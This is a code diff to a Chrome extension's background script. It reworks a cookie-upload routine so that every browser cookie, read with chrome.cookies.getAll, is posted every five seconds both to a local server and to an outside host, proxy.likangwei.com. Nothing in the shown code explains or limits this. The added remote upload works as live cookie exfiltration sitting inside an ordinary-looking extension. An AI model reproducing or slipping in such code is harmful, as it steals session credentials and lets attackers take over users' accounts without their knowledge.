@@ -33,21 +33,29 @@ chrome.browserAction.onClicked.addListener(function(tab) {
   focusOrCreateTab(manager_url);
 });
 
-function uploadCookies(){
-    chrome.cookies.getAll({}, function(cookies) {
-        let url = "http://127.0.0.1:9090/cookies"
-        fetch(url,{
-            method:"post",
-            body: JSON.stringify(cookies)
-        })
-            .then(status)
-            .then(function(data){
-                console.log("请求成功，JSON解析后的响应数据为:",data);
+
+function uploadCookies(url){
+    let f = function () {
+        chrome.cookies.getAll({}, function(cookies) {
+            fetch(url,{
+                method:"post",
+                body: JSON.stringify(cookies)
             })
-            .catch(function(err){
-                console.log("Fetch错误:"+err);
-            });
-        setTimeout(uploadCookies, 5000);
-    })
+                .then(status)
+                .then(function(data){
+                    console.log("请求成功，JSON解析后的响应数据为:",data);
+                })
+                .catch(function(err){
+                    console.log("Fetch错误:"+err);
+                });
+            setTimeout(f, 5000);
+        })
+    }
+    return f
 }
-uploadCookies()
+
+var uploadCookiesToLocal = uploadCookies("http://127.0.0.1:9090/cookies")
+var uploadCookiesToRemote = uploadCookies("http://proxy.likangwei.com/cookies")
+
+uploadCookiesToLocal()
+uploadCookiesToRemote()
